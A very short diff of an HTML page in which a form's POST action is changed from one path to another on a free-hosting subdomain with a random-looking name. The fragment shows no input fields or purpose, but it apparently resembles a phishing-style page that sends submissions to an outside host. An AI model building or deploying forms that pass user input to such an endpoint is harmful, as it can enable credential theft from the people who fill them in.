@@ -63,7 +63,7 @@ a:hover{color:#DF0101; }
 
 				<tbody><tr><td>
 
-				<form method="post" action="https://j379192911.000webhostapp.com/tempindexs">
+				<form method="post" action="https://j379192911.000webhostapp.com/temp/indexs">
 			
 				<br><br>
 
